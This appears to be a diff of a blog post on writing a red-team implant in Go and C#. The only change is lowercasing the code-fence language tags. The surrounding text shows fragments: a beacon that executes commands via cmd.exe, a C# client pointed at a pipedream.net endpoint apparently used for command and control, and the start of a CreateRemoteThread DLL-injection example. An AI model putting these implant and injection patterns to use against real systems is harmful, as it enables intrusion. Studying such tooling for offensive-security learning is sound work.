@@ -225,7 +225,7 @@ You can unhook NTDLL, overwrite memory locations with what you think should go t
 Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned 
 much the same way. For instance, a GET request in Go would look like this:
 
-```Go
+```go
 client := http.Client{} // Make our web client structure
 req, err := http.NewRequest("GET", "http://google.com", nil) // Define a new request
 req.Header.Add("User-Agent", 'Im a super nifty header') // Add some cool new headers
@@ -234,7 +234,7 @@ resp, err := client.Do(req) // Send it off
 
 And the same thing in Python:
 
-```Python
+```python
 headers = {
     'User-Agent': 'Im a super nifty header' # Set up a cool header
 }
@@ -245,7 +245,7 @@ Go requires you to do a little more setup than Python, but otherwise it's much t
 
 This can be seen again in the command execution function. First is how it's performed in Go:
 
-```Go
+```go
 cmd := exec.Command("cmd.exe", "/C", beacon_command) // exec.Command returns the Cmd struct to execute the named program with the given arguments.
 result, _ := cmd.Output() // And then get the output, _ here is to grab any errors
 hostname := []byte(result)
@@ -253,7 +253,7 @@ hostname := []byte(result)
 
 And again in Python:
 
-```Python
+```python
 command = ['cmd.exe', '/c', beacon_command] # Forming the layout of the command here
 process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)
 out, err = process.communicate()
@@ -302,7 +302,7 @@ Using C# though was much easier comparitively. What took essentially one line in
 And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they were
 made for, it just worked.
 
-```C#
+```c#
 using (client)
             {
                 client.BaseAddress = new Uri("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
@@ -320,7 +320,7 @@ C#, by nature of being a C based language, has all these tools to do memory modi
 things like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA.
 
 For example, look at the [following code taken from Codingvision.net](https://codingvision.net/c-inject-a-dll-into-a-process-w-createremotethread):
-```C#
+```c#
 public static int Main()
     {
         // the target process - I'm using a dummy process for this
